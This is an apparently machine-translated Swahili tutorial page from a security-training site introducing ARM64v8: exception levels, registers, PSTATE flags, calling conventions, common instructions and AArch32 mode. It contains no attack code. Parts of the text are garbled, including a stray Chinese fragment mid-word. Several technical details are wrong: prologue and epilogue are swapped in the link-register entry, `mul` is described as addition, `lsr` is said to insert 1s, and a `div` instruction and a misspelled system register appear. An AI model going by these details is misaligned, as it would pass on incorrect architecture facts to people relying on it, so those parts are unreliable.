# Utangulizi wa ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Viwango vya Kigezo - EL (ARM64v8)**

Katika usanifu wa ARMv8, viwango vya utekelezaji, vinavyojulikana kama Viwango vya Kigezo (ELs), vin定义 kiwango cha ruhusa na uwezo wa mazingira ya utekelezaji. Kuna viwango vinne vya kigezo, kuanzia EL0 hadi EL3, kila kimoja kikihudumia kusudi tofauti:

1. **EL0 - Hali ya Mtumiaji**:
- Hiki ndicho kiwango chenye ruhusa ndogo zaidi na kinatumika kwa kutekeleza msimbo wa programu za kawaida.
- Programu zinazotembea kwenye EL0 zimejitengea kutoka kwa kila mmoja na kutoka kwa programu za mfumo, kuimarisha usalama na utulivu.
2. **EL1 - Hali ya Kernel ya Mfumo wa Uendeshaji**:
- Makaratasi mengi ya mifumo ya uendeshaji yanakimbia kwenye kiwango hiki.
- EL1 ina ruhusa zaidi kuliko EL0 na inaweza kufikia rasilimali za mfumo, lakini kwa vizuizi fulani ili kuhakikisha uadilifu wa mfumo.
3. **EL2 - Hali ya Hypervisor**:
- Kiwango hiki kinatumika kwa uhalisia. Hypervisor inayokimbia kwenye EL2 inaweza kusimamia mifumo mingi ya uendeshaji (kila moja katika EL1 yake) inayokimbia kwenye vifaa vya kimwili sawa.
- EL2 inatoa vipengele vya kutenganisha na kudhibiti mazingira yaliyohalalishwa.
4. **EL3 - Hali ya Msimamizi Salama**:
- Hiki ndicho kiwango chenye ruhusa kubwa zaidi na mara nyingi kinatumika kwa kuanzisha salama na mazingira ya utekelezaji yaliyoaminika.
- EL3 inaweza kusimamia na kudhibiti upatikanaji kati ya hali salama na zisizo salama (kama vile kuanzisha salama, OS iliyoaminika, n.k.).

Matumizi ya viwango hivi yanaruhusu njia iliyopangwa na salama ya kusimamia vipengele tofauti vya mfumo, kutoka kwa programu za mtumiaji hadi programu za mfumo zenye ruhusa kubwa zaidi. Mbinu ya ARMv8 kuhusu viwango vya ruhusa inasaidia katika kutenganisha kwa ufanisi vipengele tofauti vya mfumo, hivyo kuimarisha usalama na uimara wa mfumo.

## **Register (ARM64v8)**

ARM64 ina **register 31 za matumizi ya jumla**, zilizoandikwa `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **64-bit** (8-byte). Kwa operesheni zinazohitaji tu thamani za 32-bit, register hizo hizo zinaweza kufikiwa katika hali ya 32-bit kwa kutumia majina w0 hadi w30.

1. **`x0`** hadi **`x7`** - Hizi kwa kawaida hutumiwa kama register za scratch na kwa kupitisha vigezo kwa subroutines.
- **`x0`** pia hubeba data ya kurudi ya kazi
2. **`x8`** - Katika kernel ya Linux, `x8` inatumika kama nambari ya wito wa mfumo kwa amri ya `svc`. **Katika macOS x16 ndiyo inayotumika!**
3. **`x9`** hadi **`x15`** - Register zaidi za muda, mara nyingi hutumiwa kwa mabadiliko ya ndani.
4. **`x16`** na **`x17`** - **Register za Wito wa Ndani**. Register za muda kwa thamani za papo hapo. Pia zinatumika kwa wito wa kazi zisizo za moja kwa moja na PLT (Jedwali la Uunganisho wa Utaratibu).
- **`x16`** inatumika kama **nambari ya wito wa mfumo** kwa amri ya **`svc`** katika **macOS**.
5. **`x18`** - **Register ya Jukwaa**. Inaweza kutumika kama register ya matumizi ya jumla, lakini kwenye baadhi ya majukwaa, register hii imehifadhiwa kwa matumizi maalum ya jukwaa: Kielelezo cha block ya mazingira ya thread ya sasa katika Windows, au kuonyesha muundo wa kazi inayotekelezwa sasa katika kernel ya linux.
6. **`x19`** hadi **`x28`** - Hizi ni register zilizohifadhiwa na mteja. Kazi lazima ihifadhi thamani za register hizi kwa mwito wake, hivyo zinahifadhiwa kwenye stack na kurejeshwa kabla ya kurudi kwa mwito.
7. **`x29`** - **Pointer ya Frame** ili kufuatilia frame ya stack. Wakati frame mpya ya stack inaundwa kwa sababu kazi inaitwa, register ya **`x29`** inahifadhiwa kwenye stack na anwani ya **pointer mpya** ya frame ni (**anwani ya `sp`**) inahifadhiwa katika register hii.
- Register hii inaweza pia kutumika kama **register ya matumizi ya jumla** ingawa kwa kawaida hutumiwa kama rejeleo kwa **mabadiliko ya ndani**.
8. **`x30`** au **`lr`**- **Register ya Kiungo**. Inashikilia **anwani ya kurudi** wakati amri ya `BL` (Tawi na Kiungo) au `BLR` (Tawi na Kiungo kwa Register) inatekelezwa kwa kuhifadhi thamani ya **`pc`** katika register hii.
- Inaweza pia kutumika kama register nyingine yoyote.
- Ikiwa kazi ya sasa inakwenda kuita kazi mpya na hivyo kuandika `lr`, itahifadhiwa kwenye stack mwanzoni, hii ni epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Hifadhi `fp` na `lr`, tengeneza nafasi na pata `fp` mpya) na kurejeshwa mwishoni, hii ni prologue (`ldp x29, x30, [sp], #48; ret` -> Rejesha `fp` na `lr` na rudi).
9. **`sp`** - **Pointer ya Stack**, inatumika kufuatilia kilele cha stack.
- thamani ya **`sp`** inapaswa kuwekwa kuwa angalau **quadword** **mwelekeo** au mwelekeo wa makosa unaweza kutokea.
10. **`pc`** - **Kikundi cha Programu**, ambacho kinaelekeza kwenye amri inayofuata. Register hii inaweza kusasishwa tu kupitia uzalishaji wa makosa, marejeo ya makosa, na matawi. Amri pekee za kawaida zinazoweza kusoma register hii ni amri za tawi na kiungo (BL, BLR) kuhifadhi anwani ya **`pc`** katika **`lr`** (Register ya Kiungo).
11. **`xzr`** - **Register ya Sifuri**. Pia inaitwa **`wzr`** katika fomu yake ya register ya **32**-bit. Inaweza kutumika kupata thamani ya sifuri kwa urahisi (operesheni ya kawaida) au kufanya kulinganisha kwa kutumia **`subs`** kama **`subs XZR, Xn, #10`** ikihifadhi data inayotokana mahali popote (katika **`xzr`**).

Register za **`Wn`** ni toleo la **32bit** la register za **`Xn`**.

### SIMD na Register za Pointi za Kuogelea

Zaidi ya hayo, kuna register nyingine **32 za urefu wa 128bit** ambazo zinaweza kutumika katika operesheni za optimized single instruction multiple data (SIMD) na kwa kufanya hesabu za pointi za kuogelea. Hizi zinaitwa register za Vn ingawa zinaweza pia kufanya kazi katika **64**-bit, **32**-bit, **16**-bit na **8**-bit na kisha zinaitwa **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** na **`Bn`**.

### Register za Mfumo

**Kuna mamia ya register za mfumo**, pia zinazoitwa register za matumizi maalum (SPRs), zinatumika kwa **kuangalia** na **kudhibiti** tabia za **processors**.\
Zinaweza kusomwa au kuwekwa tu kwa kutumia amri maalum iliyotengwa **`mrs`** na **`msr`**.

Register maalum **`TPIDR_EL0`** na **`TPIDDR_EL0`** mara nyingi hupatikana wakati wa uhandisi wa kurudi. Kiambishi cha `EL0` kinaonyesha **kigezo kidogo** ambacho register inaweza kufikiwa (katika kesi hii EL0 ni kiwango cha kawaida cha kigezo (ruhusa) ambacho programu za kawaida zinakimbia).\
Mara nyingi hutumiwa kuhifadhi **anwani ya msingi ya eneo la uhifadhi wa thread-local** la kumbukumbu. Kwa kawaida ya kwanza inaweza kusomwa na kuandikwa kwa programu zinazokimbia katika EL0, lakini ya pili inaweza kusomwa kutoka EL0 na kuandikwa kutoka EL1 (kama kernel).

- `mrs x0, TPIDR_EL0 ; Soma TPIDR_EL0 ndani ya x0`
- `msr TPIDR_EL0, X0 ; Andika x0 ndani ya TPIDR_EL0`

### **PSTATE**

**PSTATE** ina vipengele kadhaa vya mchakato vilivyopangwa katika register maalum inayoweza kuonekana na mfumo wa uendeshaji **`SPSR_ELx`**, X ikiwa ni **kiwango cha ruhusa** **cha kigezo** kilichosababisha (hii inaruhusu kurejesha hali ya mchakato wakati kigezo kinamalizika).\
Hizi ndizo sehemu zinazoweza kufikiwa:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Bendera za hali **`N`**, **`Z`**, **`C`** na **`V`**:
- **`N`** inamaanisha operesheni ilizalisha matokeo hasi
- **`Z`** inamaanisha operesheni ilizalisha sifuri
- **`C`** inamaanisha operesheni ilibeba
- **`V`** inamaanisha operesheni ilizalisha overflow iliyosainiwa:
- Jumla ya nambari mbili chanya inazalisha matokeo hasi.
- Jumla ya nambari mbili hasi inazalisha matokeo chanya.
- Katika utofauti, wakati nambari kubwa hasi inatolewa kutoka kwa nambari ndogo chanya (au kinyume chake), na matokeo hayawezi kuwakilishwa ndani ya upeo wa ukubwa wa bit uliopewa.
- Kwa wazi processor haijui operesheni hiyo ina saini au la, hivyo itakagua C na V katika operesheni na kuashiria ikiwa kubeba kumetokea katika kesi ilikuwa ya saini au isiyo ya saini.

> [!WARNING]
> Si amri zote zinazosasisha bendera hizi. Baadhi kama **`CMP`** au **`TST`** hufanya hivyo, na nyingine ambazo zina kiambishi cha s kama **`ADDS`** pia hufanya hivyo.

- Bendera ya **upana wa sasa wa register (`nRW`)**: Ikiwa bendera ina thamani 0, programu itakimbia katika hali ya utekelezaji ya AArch64 mara itakaporejeshwa.
- **Kiwango cha Kigezo** (**`EL`**): Programu ya kawaida inayokimbia katika EL0 itakuwa na thamani 0
- Bendera ya **kuangalia moja** (**`SS`**): Inatumika na debuggers kuangalia moja kwa moja kwa kuweka bendera ya SS kuwa 1 ndani ya **`SPSR_ELx`** kupitia kigezo. Programu itakimbia hatua moja na kutoa kigezo cha hatua moja.
- Bendera ya hali ya **kigezo kisichofaa** (**`IL`**): Inatumika kuashiria wakati programu yenye ruhusa inafanya uhamisho wa kiwango cha kigezo kisichofaa, bendera hii inawekwa kuwa 1 na processor inasababisha kigezo kisichofaa.
- Bendera za **`DAIF`**: Bendera hizi zinaruhusu programu yenye ruhusa kuchuja kwa hiari kigezo fulani za nje.
- Ikiwa **`A`** ni 1 inamaanisha **kuondolewa kwa asynchronous** kutasababisha. **`I`** inasanidiwa kujibu **Maombi ya Interrupts ya vifaa vya nje** (IRQs). na F inahusiana na **Maombi ya Interrupts ya Haraka** (FIRs).
- Bendera za **uchaguzi wa pointer ya stack** (**`SPS`**): Programu zenye ruhusa zinazokimbia katika EL1 na juu zinaweza kubadilisha kati ya kutumia register yao ya pointer ya stack na ile ya mtumiaji (k.m. kati ya `SP_EL1` na `EL0`). Kubadilisha hii inafanywa kwa kuandika kwenye register maalum ya **`SPSel`**. Hii haiwezi kufanywa kutoka EL0.

## **Mkataba wa Wito (ARM64v8)**

Mkataba wa wito wa ARM64 unasisitiza kwamba **vigezo vinane vya kwanza** kwa kazi vinapitishwa katika register **`x0` hadi `x7`**. **Vigezo** vya ziada vinapitishwa kwenye **stack**. Thamani ya **kurudi** inarudishwa katika register **`x0`**, au katika **`x1`** pia **ikiwa ni 128 bits ndefu**. Register za **`x19`** hadi **`x30`** na **`sp`** lazima **zihifadhiwe** kati ya wito wa kazi.

Wakati wa kusoma kazi katika assembly, angalia **prologue na epilogue ya kazi**. **Prologue** kwa kawaida inahusisha **kuhifadhi pointer ya frame (`x29`)**, **kuweka** pointer mpya ya frame, na **kuandaa nafasi ya stack**. **Epilogue** kwa kawaida inahusisha **kurejesha pointer ya frame iliyohifadhiwa** na **kurudi** kutoka kwa kazi.

### Mkataba wa Wito katika Swift

Swift ina **mkataba wake wa wito** ambao unaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Amri za Kawaida (ARM64v8)**

Amri za ARM64 kwa ujumla zina **muundo `opcode dst, src1, src2`**, ambapo **`opcode`** ni **operesheni** inayopaswa kufanywa (kama `add`, `sub`, `mov`, n.k.), **`dst`** ni **register ya marudio** ambapo matokeo yatahifadhiwa, na **`src1`** na **`src2`** ni **register za chanzo**. Thamani za papo hapo zinaweza pia kutumika badala ya register za chanzo.

- **`mov`**: **Hamisha** thamani kutoka register moja hadi nyingine.
- Mfano: `mov x0, x1` — Hii inahamisha thamani kutoka `x1` hadi `x0`.
- **`ldr`**: **Pakia** thamani kutoka **kumbukumbu** hadi **register**.
- Mfano: `ldr x0, [x1]` — Hii inapakua thamani kutoka eneo la kumbukumbu lililoonyeshwa na `x1` hadi `x0`.
- **Hali ya Offset**: Offset inayohusisha kiashiria cha asili inaonyeshwa, kwa mfano:
- `ldr x2, [x1, #8]`, hii itapakia katika x2 thamani kutoka x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, hii itapakia katika x2 kitu kutoka kwenye array x0, kutoka kwenye nafasi x1 (index) \* 4
- **Hali ya Pre-indexed**: Hii itatumia hesabu kwa asili, kupata matokeo na pia kuhifadhi asili mpya katika asili.
- `ldr x2, [x1, #8]!`, hii itapakia `x1 + 8` katika `x2` na kuhifadhi katika x1 matokeo ya `x1 + 8`
- `str lr, [sp, #-4]!`, Hifadhi register ya kiungo katika sp na sasisha register sp
- **Hali ya Post-index**: Hii ni kama ile ya awali lakini anwani ya kumbukumbu inafikiwa na kisha offset inakokotwa na kuhifadhiwa.
- `ldr x0, [x1], #8`, pakia `x1` katika `x0` na sasisha x1 na `x1 + 8`
- **Uelekeo wa PC-relative**: Katika kesi hii anwani ya kupakia inakokotwa kulingana na register ya PC
- `ldr x1, =_start`, Hii itapakia anwani ambapo alama ya `_start` inaanza katika x1 inayohusiana na PC ya sasa.
- **`str`**: **Hifadhi** thamani kutoka **register** hadi **kumbukumbu**.
- Mfano: `str x0, [x1]` — Hii inahifadhi thamani katika `x0` kwenye eneo la kumbukumbu lililoonyeshwa na `x1`.
- **`ldp`**: **Pakia Jozi za Register**. Amri hii **inapakia register mbili** kutoka **sehemu za kumbukumbu** zinazofuatana. Anwani ya kumbukumbu kwa kawaida inaundwa kwa kuongeza offset kwa thamani katika register nyingine.
- Mfano: `ldp x0, x1, [x2]` — Hii inapakua `x0` na `x1` kutoka maeneo ya kumbukumbu katika `x2` na `x2 + 8`, mtawalia.
- **`stp`**: **Hifadhi Jozi za Register**. Amri hii **inahifadhi register mbili** kwenye **sehemu za kumbukumbu** zinazofuatana. Anwani ya kumbukumbu kwa kawaida inaundwa kwa kuongeza offset kwa thamani katika register nyingine.
- Mfano: `stp x0, x1, [sp]` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu katika `sp` na `sp + 8`, mtawalia.
- `stp x0, x1, [sp, #16]!` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu katika `sp+16` na `sp + 24`, mtawalia, na sasisha `sp` na `sp+16`.
- **`add`**: **Ongeza** thamani za register mbili na uhifadhi matokeo katika register.
- Sintaksia: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Marudio
- Xn2 -> Operandi 1
- Xn3 | #imm -> Operandi 2 (register au papo hapo)
- \[shift #N | RRX] -> Fanya shift au piga RRX
- Mfano: `add x0, x1, x2` — Hii inaongeza thamani katika `x1` na `x2` pamoja na kuhifadhi matokeo katika `x0`.
- `add x5, x5, #1, lsl #12` — Hii inalingana na 4096 (1 shifter mara 12) -> 1 0000 0000 0000 0000
- **`adds`** Hii inafanya `add` na inasasisha bendera
- **`sub`**: **Punguza** thamani za register mbili na uhifadhi matokeo katika register.
- Angalia **`add`** **sintaksia**.
- Mfano: `sub x0, x1, x2` — Hii inapunguza thamani katika `x2` kutoka `x1` na kuhifadhi matokeo katika `x0`.
- **`subs`** Hii ni kama sub lakini inasasisha bendera
- **`mul`**: **Weka** thamani za **register mbili** na uhifadhi matokeo katika register.
- Mfano: `mul x0, x1, x2` — Hii inaongeza thamani katika `x1` na `x2` na kuhifadhi matokeo katika `x0`.
- **`div`**: **Gawanya** thamani ya register moja kwa nyingine na uhifadhi matokeo katika register.
- Mfano: `div x0, x1, x2` — Hii inagawanya thamani katika `x1` kwa `x2` na kuhifadhi matokeo katika `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Shift ya Kihisia Kushoto**: Ongeza 0s kutoka mwisho ukihamisha bits nyingine mbele (ongeza kwa n-mara 2)
- **Shift ya Kihisia Kulia**: Ongeza 1s mwanzoni ukihamisha bits nyingine nyuma (gawanya kwa n-mara 2 katika isiyo ya saini)
- **Shift ya Kihisia Kulia**: Kama **`lsr`**, lakini badala ya kuongeza 0s ikiwa bit muhimu zaidi ni 1, **1s zinaongezwa** (gawanya kwa n-mara 2 katika saini)
- **Piga Kulia**: Kama **`lsr`** lakini chochote kinachondolewa kutoka kulia kinatolewa kushoto
- **Piga Kulia na Kuongeza**: Kama **`ror`**, lakini na bendera ya kubeba kama "bit muhimu zaidi". Hivyo bendera ya kubeba inahamishwa kwa bit 31 na bit iliyondolewa kwa bendera ya kubeba.
- **`bfm`**: **Hamisha Bit Filed**, operesheni hizi **nakala bits `0...n`** kutoka kwa thamani na kuziweka katika nafasi **`m..m+n`**. **`#s`** inaashiria **nafasi ya bit ya kushoto** na **`#r`** ni **kiasi cha kuhamasisha kulia**.
- Hamisha bitfiled: `BFM Xd, Xn, #r`
- Hamisha Bitfield ya Saini: `SBFM Xd, Xn, #r, #s`
- Hamisha Bitfield isiyo ya Saini: `UBFM Xd, Xn, #r, #s`
- **Hamisha na Ingiza Bitfield:** Nakala bitfield kutoka register moja na kuhamasisha kwenye register nyingine.
- **`BFI X1, X2, #3, #4`** Ingiza bits 4 kutoka X2 kutoka bit ya 3 ya X1
- **`BFXIL X1, X2, #3, #4`** Toa kutoka bit ya 3 ya X2 bits nne na kuhamasisha kwenye X1
- **`SBFIZ X1, X2, #3, #4`** Ongeza saini bits 4 kutoka X2 na kuhamasisha kwenye X1 kuanzia kwenye nafasi ya bit 3 ikizima bits za kulia
- **`SBFX X1, X2, #3, #4`** Inatoa bits 4 kuanzia bit 3 kutoka X2, inaongeza saini, na kuweka matokeo katika X1
- **`UBFIZ X1, X2, #3, #4`** Ongeza sifuri bits 4 kutoka X2 na kuhamasisha kwenye X1 kuanzia kwenye nafasi ya bit 3 ikizima bits za kulia
- **`UBFX X1, X2, #3, #4`** Inatoa bits 4 kuanzia bit 3 kutoka X2 na kuweka matokeo yaliyoongezwa sifuri katika X1.
- **Ongeza Saini kwa X:** Ongeza saini (au ongeza tu 0s katika toleo lisilo la saini) la thamani ili uweze kufanya operesheni nayo:
- **`SXTB X1, W2`** Ongeza saini ya byte **kutoka W2 hadi X1** (`W2` ni nusu ya `X2`) ili kujaza 64bits
- **`SXTH X1, W2`** Ongeza saini ya nambari ya 16bit **kutoka W2 hadi X1** ili kujaza 64bits
- **`SXTW X1, W2`** Ongeza saini ya byte **kutoka W2 hadi X1** ili kujaza 64bits
- **`UXTB X1, W2`** Ongeza 0s (isiyo ya saini) kwa byte **kutoka W2 hadi X1** ili kujaza 64bits
- **`extr`:** Inatoa bits kutoka **jozi maalum za register zilizounganishwa**.
- Mfano: `EXTR W3, W2, W1, #3` Hii itafanya **kuunganisha W1+W2** na kupata **kuanzia bit 3 ya W2 hadi bit 3 ya W1** na kuhifadhi katika W3.
- **`cmp`**: **Linganisha** register mbili na kuweka bendera za hali. Ni **alias ya `subs`** ikiseti register ya marudio kuwa register ya sifuri. Inafaida kujua ikiwa `m == n`.
- Inasaidia **sintaksia sawa na `subs`**
- Mfano: `cmp x0, x1` — Hii inalinganisha thamani katika `x0` na `x1` na kuweka bendera za hali ipasavyo.
- **`cmn`**: **Linganishi operand hasi**. Katika kesi hii ni **alias ya `adds`** na inasaidia sintaksia sawa. Inafaida kujua ikiwa `m == -n`.
- **`ccmp`**: Linganisha kwa masharti, ni kulinganisha ambayo itafanywa tu ikiwa kulinganisha kwa awali ilikuwa kweli na itaseti bits za nzcv kwa usahihi.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ikiwa x1 != x2 na x3 < x4, ruka kwa func
- Hii ni kwa sababu **`ccmp`** itatekelezwa tu ikiwa **`cmp` ya awali ilikuwa `NE`**, ikiwa haikuwa bits `nzcv` zitawekwa kuwa 0 (ambayo haitaridhisha kulinganisha `blt`).
- Hii pia inaweza kutumika kama `ccmn` (sawa lakini hasi, kama `cmp` dhidi ya `cmn`).
- **`tst`**: Inakagua ikiwa yoyote ya thamani za kulinganisha ni 1 (inafanya kazi kama ANDS bila kuhifadhi matokeo mahali popote). Inafaida kuangalia register na thamani na kuangalia ikiwa yoyote ya bits za register iliyoonyeshwa katika thamani ni 1.
- Mfano: `tst X1, #7` Angalia ikiwa yoyote ya bits tatu za mwisho za X1 ni 1
- **`teq`**: Operesheni ya XOR ikitenga matokeo
- **`b`**: Tawi lisilo na masharti
- Mfano: `b myFunction`
- Kumbuka kwamba hii haitajaza register ya kiungo na anwani ya kurudi (siyo sahihi kwa wito wa subrutine ambao unahitaji kurudi nyuma)
- **`bl`**: **Tawi** na kiungo, inatumika **kuita** **subroutine**. Hifadhi **anwani ya kurudi katika `x30`**.
- Mfano: `bl myFunction` — Hii inaita kazi `myFunction` na kuhifadhi anwani ya kurudi katika `x30`.
- Kumbuka kwamba hii haitajaza register ya kiungo na anwani ya kurudi (siyo sahihi kwa wito wa subrutine ambao unahitaji kurudi nyuma)
- **`blr`**: **Tawi** na Kiungo kwa Register, inatumika **kuita** **subroutine** ambapo lengo linatolewa katika **register**. Hifadhi anwani ya kurudi katika `x30`. (Hii ni
- Mfano: `blr x1` — Hii inaita kazi ambayo anwani yake inapatikana katika `x1` na kuhifadhi anwani ya kurudi katika `x30`.
- **`ret`**: **Rudi** kutoka **subroutine**, kwa kawaida ikitumia anwani katika **`x30`**.
- Mfano: `ret` — Hii inarudi kutoka kwa subroutine ya sasa ikitumia anwani ya kurudi katika `x30`.
- **`b.<cond>`**: Matawi ya masharti
- **`b.eq`**: **Tawi ikiwa sawa**, kulingana na amri ya awali ya `cmp`.
- Mfano: `b.eq label` — Ikiwa amri ya awali ya `cmp` iligundua thamani mbili sawa, hii inaruka kwa `label`.
- **`b.ne`**: **Tawi ikiwa Siyo Sawa**. Amri hii inakagua bendera za hali (ambazo ziliwekwa na amri ya kulinganisha ya awali), na ikiwa thamani zilizolinganishwa hazikuwa sawa, inatunga kwa lebo au anwani.
- Mfano: Baada ya amri ya `cmp x0, x1`, `b.ne label` — Ikiwa thamani katika `x0` na `x1` hazikuwa sawa, hii inaruka kwa `label`.
- **`cbz`**: **Linganishi na Tawi kwa Sifuri**. Amri hii inalinganisha register na sifuri, na ikiwa sawa, inatunga kwa lebo au anwani.
- Mfano: `cbz x0, label` — Ikiwa thamani katika `x0` ni sifuri, hii inaruka kwa `label`.
- **`cbnz`**: **Linganishi na Tawi kwa Siyo Sifuri**. Amri hii inalinganisha register na sifuri, na ikiwa hazikuwa sawa, inatunga kwa lebo au anwani.
- Mfano: `cbnz x0, label` — Ikiwa thamani katika `x0` si sifuri, hii inaruka kwa `label`.
- **`tbnz`**: Jaribu bit na tawi kwa siyo sifuri
- Mfano: `tbnz x0, #8, label`
- **`tbz`**: Jaribu bit na tawi kwa sifuri
- Mfano: `tbz x0, #8, label`
- **Operesheni za kuchagua kwa masharti**: Hizi ni operesheni ambazo tabia yake inabadilika kulingana na bits za masharti.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ikiwa kweli, X0 = X1, ikiwa si kweli, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si kweli, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ikiwa kweli, Xd = Xn + 1, ikiwa si kweli, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si kweli, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ikiwa kweli, Xd = NOT(Xn), ikiwa si kweli, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si kweli, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ikiwa kweli, Xd = - Xn, ikiwa si kweli, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = 1, ikiwa si kweli, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = \<all 1>, ikiwa si kweli, Xd = 0
- **`adrp`**: Hesabu **anwani ya ukurasa ya alama** na uhifadhi katika register.
- Mfano: `adrp x0, symbol` — Hii inahesabu anwani ya ukurasa ya `symbol` na kuihifadhi katika `x0`.
- **`ldrsw`**: **Pakia** thamani ya saini **ya 32-bit** kutoka kumbukumbu na **ongeza saini hadi 64** bits.
- Mfano: `ldrsw x0, [x1]` — Hii inapakua thamani ya saini ya 32-bit kutoka eneo la kumbukumbu lililoonyeshwa na `x1`, inaongeza saini hadi 64 bits, na kuihifadhi katika `x0`.
- **`stur`**: **Hifadhi thamani ya register kwenye eneo la kumbukumbu**, kwa kutumia offset kutoka register nyingine.
- Mfano: `stur x0, [x1, #4]` — Hii inahifadhi thamani katika `x0` kwenye anwani ya kumbukumbu ambayo ni bytes 4 zaidi kuliko anwani iliyopo katika `x1`.
- **`svc`** : Fanya **wito wa mfumo**. Inasimama kwa "Wito wa Msimamizi". Wakati processor inatekeleza amri hii, inabadilisha kutoka hali ya mtumiaji hadi hali ya kernel na kuruka kwenye eneo maalum la kumbukumbu ambapo **kanuni ya kushughulikia wito wa mfumo wa kernel** inapatikana.

- Mfano:

```armasm
mov x8, 93  ; Pakia nambari ya wito wa mfumo kwa kutoka (93) ndani ya register x8.
mov x0, 0   ; Pakia msimamo wa kutoka (0) ndani ya register x0.
svc 0       ; Fanya wito wa mfumo.
```

### **Prologue ya Kazi**

1. **Hifadhi register ya kiungo na pointer ya frame kwenye stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Weka kiashiria kipya cha fremu**: `mov x29, sp` (weka kiashiria kipya cha fremu kwa kazi ya sasa)  
3. **Panga nafasi kwenye stack kwa ajili ya mabadiliko ya ndani** (ikiwa inahitajika): `sub sp, sp, <size>` (ambapo `<size>` ni idadi ya bytes zinazohitajika)  

### **Epilogue ya Kazi**

1. **Futa mabadiliko ya ndani (ikiwa yoyote yalikuwa yamepangwa)**: `add sp, sp, <size>`  
2. **Rejesha kiashiria cha kiungo na kiashiria cha fremu**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (inarudisha udhibiti kwa mwito kwa kutumia anwani katika register ya kiungo)

## AARCH32 Hali ya Utendaji

Armv8-A inasaidia utendaji wa programu za bit 32. **AArch32** inaweza kukimbia katika moja ya **seti mbili za maagizo**: **`A32`** na **`T32`** na inaweza kubadilisha kati yao kupitia **`interworking`**.\
**Programu za 64-bit** zenye mamlaka zinaweza kupanga **utendaji wa programu za 32-bit** kwa kutekeleza uhamisho wa kiwango cha kipekee kwa 32-bit yenye mamlaka ya chini.\
Kumbuka kwamba mpito kutoka 64-bit hadi 32-bit unafanyika kwa kupunguza kiwango cha kipekee (kwa mfano, programu ya 64-bit katika EL1 ikichochea programu katika EL0). Hii inafanywa kwa kuweka **bit 4 ya** **`SPSR_ELx`** register maalum **kuwa 1** wakati mchakato wa `AArch32` uko tayari kutekelezwa na sehemu nyingine ya `SPSR_ELx` inahifadhi **CPSR** za programu za **`AArch32`**. Kisha, mchakato wenye mamlaka unaita maagizo ya **`ERET`** ili processor ipitie **`AArch32`** ikingia katika A32 au T32 kulingana na CPSR**.**

**`interworking`** inafanyika kwa kutumia bit J na T za CPSR. `J=0` na `T=0` inamaanisha **`A32`** na `J=0` na `T=1` inamaanisha **T32**. Hii kimsingi inamaanisha kuweka **bit ya chini kabisa kuwa 1** kuashiria kwamba seti ya maagizo ni T32.\
Hii imewekwa wakati wa **maagizo ya tawi la interworking,** lakini inaweza pia kuwekwa moja kwa moja na maagizo mengine wakati PC imewekwa kama register ya marudio. Mfano:

Mfano mwingine:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Kuna register 16 za 32-bit (r0-r15). **Kuanzia r0 hadi r14** zinaweza kutumika kwa **operesheni yoyote**, hata hivyo baadhi yao mara nyingi huhifadhiwa:

- **`r15`**: Program counter (daima). Inashikilia anwani ya amri inayofuata. Katika A32 sasa + 8, katika T32, sasa + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer
- **`r14`**: Link Register

Zaidi ya hayo, register zinaungwa mkono katika **`banked registries`**. Ambazo ni maeneo yanayohifadhi thamani za register kuruhusu kufanya **fast context switching** katika usimamizi wa makosa na operesheni za kibali ili kuepuka hitaji la kuhifadhi na kurejesha register kwa mikono kila wakati.\
Hii inafanywa kwa **kuhifadhi hali ya processor kutoka `CPSR` hadi `SPSR`** ya hali ya processor ambayo makosa yanachukuliwa. Wakati makosa yanarejea, **`CPSR`** inarejeshwa kutoka **`SPSR`**.

### CPSR - Current Program Status Register

Katika AArch32 CPSR inafanya kazi kama **`PSTATE`** katika AArch64 na pia inahifadhiwa katika **`SPSR_ELx`** wakati makosa yanachukuliwa ili kurejesha utekelezaji baadaye:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Sehemu zimegawanywa katika makundi kadhaa:

- Application Program Status Register (APSR): Bendera za hesabu na zinazoweza kufikiwa kutoka EL0
- Execution State Registers: Tabia ya mchakato (inasimamiwa na OS).

#### Application Program Status Register (APSR)

- Bendera **`N`**, **`Z`**, **`C`**, **`V`** (kama ilivyo katika AArch64)
